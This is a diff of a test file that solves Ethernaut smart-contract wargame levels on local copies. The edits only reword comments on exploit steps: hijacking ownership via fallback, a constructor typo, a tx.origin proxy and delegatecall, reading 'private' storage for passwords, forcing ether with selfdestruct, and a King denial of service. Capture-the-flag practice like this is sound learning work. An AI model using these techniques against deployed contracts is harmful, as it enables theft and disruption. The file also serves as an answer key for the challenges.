@@ -57,8 +57,8 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await Fallback.new();
-			await contract.contribute({ from: hacker, value: amount }); // amount needs to be less than 0.001 ether
-			await web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount, data: null }); // trigger receive() function | this will set the hacker as the new owner
+			await contract.contribute({ from: hacker, value: amount }); // sned amount less than 0.001 ether to bypass "require" in the next call
+			await web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount, data: null }); // trigger the receive() function to set the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
 			try {
@@ -68,7 +68,7 @@ contract("Ethernaut", (accounts) => {
 				const exceptionExpected = "caller is not the owner";
 				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 1.");
 			}
-			// another example
+			// another example without class objects
 			/*
 			const instance = Fallback.networks["5777"].address;
 			const contract = new web3.eth.Contract(Fallback.abi, instance);
@@ -94,7 +94,7 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await Fallout.new();
-			await contract.Fal1out({ from: hacker, value: amount }); // typo in the constructor function makes it a normal function | this will set the hacker as the new owner
+			await contract.Fal1out({ from: hacker, value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 2.");
 			try {
@@ -135,7 +135,7 @@ contract("Ethernaut", (accounts) => {
 		it("Exploit", async () => {
 			const contract = await Telephone.new();
 			const exploit = await TelephoneExploit.new();
-			await exploit.run(contract.address, hacker); // this will set the hacker as the new owner
+			await exploit.run(contract.address, hacker); // use a proxy contract to bypass "tx.origin" check | this will set the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 4."); // become the owner to pass the level
 		});
@@ -159,7 +159,7 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await Delegate.new(owner);
-			await web3.eth.sendTransaction({ from: hacker, to: contract.address, data: web3.utils.keccak256("pwn()") }); // this will set the hacker as the new owner
+			await web3.eth.sendTransaction({ from: hacker, to: contract.address, data: web3.utils.keccak256("pwn()") }); // trigger the fallback() function to set the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 6."); // become the owner to pass the level
 		});
@@ -176,10 +176,10 @@ contract("Ethernaut", (accounts) => {
 			const contract = await Force.new();
 			const exploit = await ForceExploit.new();
 			const balanceOld = await web3.eth.getBalance(contract.address);
-			await web3.eth.sendTransaction({ from: hacker, to: exploit.address, value: amount, data: null }); // trigger receive() function | send some balance
-			await exploit.destroy(contract.address, { from: hacker }); // force sending the whole balance to the target using selfdestruct()
+			await web3.eth.sendTransaction({ from: hacker, to: exploit.address, value: amount, data: null }); // send some balance to the exploit contract using the receive() function
+			await exploit.destroy(contract.address, { from: hacker }); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
 			const balanceNew = await web3.eth.getBalance(contract.address);
-			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's balance greater than zero to pass the level
+			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
 		});
 	});
 
@@ -189,8 +189,8 @@ contract("Ethernaut", (accounts) => {
 			assert(deployed, "Vault contract is not deployed.");
 		});
 		it("Exploit", async () => {
-			const contract = await Vault.new(web3.utils.utf8ToHex("ethernaut8")); // initial password | password is saved in storage and storage is always public
-			const passwordCurrent = web3.utils.hexToAscii(await web3.eth.getStorageAt(contract.address, 1));
+			const contract = await Vault.new(web3.utils.utf8ToHex("ethernaut8")); // the password is stored in the contract storage which is public
+			const passwordCurrent = web3.utils.hexToAscii(await web3.eth.getStorageAt(contract.address, 1)); // retrieve the password from the contract storage
 			await contract.unlock(web3.utils.utf8ToHex(passwordCurrent));
 			const locked = await contract.locked();
 			assert(!locked, "Failed to pass level 8."); // unlock to pass the level
@@ -207,8 +207,8 @@ contract("Ethernaut", (accounts) => {
 		it("Exploit", async () => {
 			const contract = await King.new({ from: owner, value: amount });
 			const exploit = await KingExploit.new();
-			await exploit.run(contract.address, { value: amount + 1 }); // set a new king with no receive() nor fallback() functions | this will DoS the game
-			// any new transaction will now revert
+			await exploit.run(contract.address, { value: amount + 1 }); // set the new king and DoS the game | omit receive() and fallback() functions in the exploit contract to "crash" the game
+			// any new transaction (attempt to become a new king) will now revert because the previous king (exploit contract) does not have the receive() and fallback() functions
 			await expectRevert.unspecified(web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount + 2, data: null })); // DoS the game to pass the level
 		});
 	});
@@ -223,11 +223,11 @@ contract("Ethernaut", (accounts) => {
 		it("Exploit", async () => {
 			const contract = await Reentrance.new();
 			const exploit = await ReentranceExploit.new();
-			await contract.donate(user, { value: amount }); // put some balance inside from some other user
+			await contract.donate(user, { value: amount * 3 }); // put in some balance from other users
 			// const balanceOld = await web3.eth.getBalance(contract.address);
 			// await exploit.run(contract.address, { value: amount, gas: 4465030 }); // create the integer underflow using reentrancy
 			// const balanceNew = await web3.eth.getBalance(contract.address);
-			// assert(balanceNew > balanceOld, "Failed to pass level 10."); // withdraw all crypto to pass the level
+			// assert(balanceNew > balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
 			await expectRevert.unspecified(exploit.run(contract.address, { value: amount, gas: 4465030 })); // solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
 		});
 	});
@@ -254,13 +254,14 @@ contract("Ethernaut", (accounts) => {
 			assert(deployed, "Privacy contract is not deployed.");
 		});
 		it("Exploit", async () => {
-			const contract = await Privacy.new([
-				web3.utils.padLeft(web3.utils.asciiToHex("ether"), 64), // bytes32
+			const contract = await Privacy.new([ // bytes32 array is stored in the contract storage which is public
+				web3.utils.padLeft(web3.utils.asciiToHex("ether"), 64), // 32 bytes = 64 length / 2 hex chars
 				web3.utils.padLeft(web3.utils.asciiToHex("naut"), 64),
-				web3.utils.padLeft(web3.utils.asciiToHex("12"), 64) // this is the key
+				web3.utils.padLeft(web3.utils.asciiToHex("12"), 64) // this is the key we need
 			]);
-			const key = await web3.eth.getStorageAt(contract.address, 5); // key is public
-			await contract.unlock(key.substring(0, 32)); // bytes16
+			// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
+			const key = await web3.eth.getStorageAt(contract.address, 5); // retrieve the key from the contract storage
+			await contract.unlock(key.substring(0, 32)); // convert / trim the key to bytes16 value
 			const locked = await contract.locked();
 			assert(!locked, "Failed to pass level 12."); // unlock to pass the level
 		});
